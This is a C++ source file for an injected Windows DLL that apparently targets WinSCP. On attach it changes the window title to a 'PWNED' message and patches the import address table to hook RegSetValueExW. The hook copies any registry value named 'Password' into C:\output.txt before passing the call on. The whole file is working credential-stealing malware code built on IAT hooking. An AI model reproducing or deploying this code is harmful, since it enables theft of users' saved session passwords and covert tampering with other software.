#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <tchar.h>
#include <string.h>
#include <psapi.h>
#include <strsafe.h>
#include <fstream>

#define BUFSIZE 512

#define IMPORT_TABLE_OFFSET 1

BOOL CALLBACK changeWindowCallBack(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
) {
	DWORD outputPid = NULL;
	GetWindowThreadProcessId(hwnd, &outputPid);
	DWORD pidToSet = *(PDWORD(lParam));
	if (outputPid == pidToSet) {
		SetWindowText(hwnd, "WinSCP is PWNED by Lidor and Neriya!");
	}

	return TRUE;
}

void changeWindowTitle() {
	DWORD currentPid = GetCurrentProcessId();
	EnumWindows(changeWindowCallBack, (LPARAM)&currentPid);
}

PIMAGE_IMPORT_DESCRIPTOR getImportTable(HMODULE hInstance)
{
	PIMAGE_DOS_HEADER dosHeader;
	IMAGE_OPTIONAL_HEADER optionalHeader;
	PIMAGE_NT_HEADERS ntHeader;
	IMAGE_DATA_DIRECTORY dataDirectory;

	dosHeader = (PIMAGE_DOS_HEADER)hInstance;
	ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
    optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader);
	dataDirectory = (IMAGE_DATA_DIRECTORY)(optionalHeader.DataDirectory[IMPORT_TABLE_OFFSET]);
	return (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hInstance + dataDirectory.VirtualAddress);
}


bool rewriteThunk(PIMAGE_THUNK_DATA pThunk, void* newFunc)
{
	DWORD CurrentProtect;
	DWORD junk;
	VirtualProtect(pThunk, 4096, PAGE_READWRITE, &CurrentProtect);
	pThunk->u1.Function = (DWORD)newFunc;
	VirtualProtect(pThunk, 4096, CurrentProtect, &junk);
	return true;
}

LSTATUS APIENTRY MyRegSetValueExW(
	_In_ HKEY hKey,
	_In_opt_ LPCWSTR lpValueName,
	_Reserved_ DWORD Reserved,
	_In_ DWORD dwType,
	_In_reads_bytes_opt_(cbData) CONST BYTE * lpData,
	_In_ DWORD cbData
)
{
	OutputDebugStringW(L"MyRegSetValueExW");
	OutputDebugStringW(lpValueName);

	if (wcscmp(lpValueName, L"Password") == 0)
	{
		OutputDebugStringW(L"MyRegSetValueExW found the password");
		std::ofstream outFile;
		outFile.open("C:\\output.txt", std::ios::binary | std::ios::out | std::fstream::app);
		outFile.write((char*)lpData, cbData);
		outFile.close();
		OutputDebugStringW(L"MyRegSetValueExW done storing");
	}
	return RegSetValueExW(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}

void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
{
	HMODULE currentProcessImage = GetModuleHandleA(NULL);
	PIMAGE_IMPORT_DESCRIPTOR importedModule;
	PIMAGE_THUNK_DATA pFirstThunk, pOriginalFirstThunk;
	PIMAGE_IMPORT_BY_NAME pFuncData;
	importedModule = getImportTable(currentProcessImage);
	bool doneHooking = false;
	
	while (*(WORD*)importedModule != 0)
	{
		pFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule->FirstThunk);
		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule ->OriginalFirstThunk);
		pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk ->u1.AddressOfData);

		OutputDebugStringA((char*)((PBYTE)currentProcessImage + importedModule->Name));
		if (strcmp("ADVAPI32.DLL", (char*)((PBYTE)currentProcessImage + importedModule->Name)) == 0) 
		{
			OutputDebugStringA((char*)((PBYTE)currentProcessImage + importedModule->Name));
			while (*(WORD*)pFirstThunk != 0 && *(WORD*)pOriginalFirstThunk != 0)
			{
				OutputDebugStringA((char*)pFuncData->Name);
				if (strcmp(funcNameToPatch, (char*)pFuncData->Name) == 0)
				{
					OutputDebugStringW(L"Hooking:");
					OutputDebugStringA(funcNameToPatch);
					if (rewriteThunk(pFirstThunk, funcToRunInstead))
					{
						OutputDebugStringW(L"Patch Successfully");
						doneHooking = true;
						break;
					}
				}

				pOriginalFirstThunk++;
				pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);
				pFirstThunk++;
			}
		}

		if(doneHooking)
		{
			break;
		}

		importedModule++; //next module (DLL)
	}

	OutputDebugStringW(L"patchIAT end");
}

BOOL APIENTRY DllMain(
    _In_ HINSTANCE hInst,
    _In_ DWORD     reason,
    _In_ LPVOID    reserved
) {
    switch (reason) {
		case DLL_PROCESS_ATTACH:
	    {	    
			OutputDebugStringW(L"DllMain");
			changeWindowTitle();
			patchIAT("RegSetValueExW", MyRegSetValueExW);
			OutputDebugStringW(L"IATPatching DllMain end");
		}
		default: ;
    }
	
    return TRUE;
}
